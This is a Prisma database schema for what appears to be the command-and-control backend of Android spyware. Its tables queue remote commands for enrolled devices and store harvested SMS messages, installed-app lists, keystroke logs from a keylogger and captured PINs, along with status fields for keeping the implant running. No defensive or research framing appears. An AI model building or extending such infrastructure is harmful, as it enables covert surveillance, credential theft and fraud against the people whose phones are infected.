// This is your Prisma schema file,
// learn more about it in the docs: https://pris.ly/d/prisma-schema

// Looking for ways to speed up your queries, or scale easily with your serverless or edge functions?
// Try Prisma Accelerate: https://pris.ly/cli/accelerate-init

generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}


model Device {
  id             Int      @id @default(autoincrement())
  device_id      String   @unique
  android_id     String?
  manufacturer   String
  model          String
  brand          String?
  product        String?
  android_version String?
  raw_device_info String?
  
  // Status fields stored as JSON
  sim_cards         Json?    
  service_status    Json?
  oem_status        Json?
  power_save_status Json?
  screen_status     Json?
  process_importance Int?

  last_seen      DateTime @default(now())
  is_online      Boolean  @default(false)
  created_at     DateTime @default(now())
  
  commands       Command[]
  heartbeats     Heartbeat[]
  sms            Sms[]
  installedApps  InstalledApp[]
  keyLogs        KeyLog[]
  pins           Pin[]
}

model Command {
  id           Int      @id @default(autoincrement())
  device_id    String
  command      String   // Corresponds to 'command' in Kotlin
  payload      Json?    // Corresponds to 'payload' in Kotlin
  status       String   @default("pending")
  error        String?
  created_at   DateTime @default(now())
  updated_at   DateTime @default(now())
  
  device       Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
  
  @@index([device_id])
  @@index([status])
}

model Heartbeat {
  id           Int      @id @default(autoincrement())
  device_id    String
  status       Boolean?  @default(false)
  last_update  String
  uptime       BigInt
  ram          BigInt
  timestamp    DateTime @default(now())
  
  device       Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
  
  @@index([device_id])
  @@index([timestamp])
}

model Sms {
  id             Int      @id @default(autoincrement()) // Internal DB ID
  android_sms_id BigInt   // ID from the device
  device_id      String
  address        String
  body           String
  date           String   // Date string from device
  timestamp      BigInt   // Timestamp from device
  type           Int
  read           Boolean  @default(false)
  created_at     DateTime @default(now())
  
  device         Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
  
  @@unique([device_id, android_sms_id])
  @@index([device_id])
}

model InstalledApp {
  id                  Int      @id @default(autoincrement())
  device_id           String
  package_name        String
  app_name            String
  icon                String?
  version_name        String?
  version_code        BigInt?
  first_install_time  BigInt?
  last_update_time    BigInt?
  is_system_app       Boolean  @default(false)
  target_sdk          Int?
  min_sdk             Int?
  sync_timestamp      BigInt   @default(0)
  
  created_at          DateTime? // String in Kotlin but usually parsed, keeping somewhat flexible or let's use String if we want exact match? Kotlin says String? for createdAt. Let's start with matching Kotlin types where possible but DB prefers DateTime. I will stick to DB DateTime for created/updated and parse server-side.
  updated_at          DateTime?

  device              Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
  
  @@unique([device_id, package_name])
  @@index([device_id])
}

model KeyLog {
  id           Int      @id @default(autoincrement())
  device_id    String
  keylogger    String
  key          String
  current_date String
  created_at   DateTime @default(now())
  
  device       Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
  
  @@index([device_id])
}

model Pin {
  id           Int      @id @default(autoincrement())
  device_id    String
  pin          String
  current_date String
  created_at   DateTime @default(now())
  
  device       Device   @relation(fields: [device_id], references: [device_id], onDelete: Cascade)
  
  @@index([device_id])
}
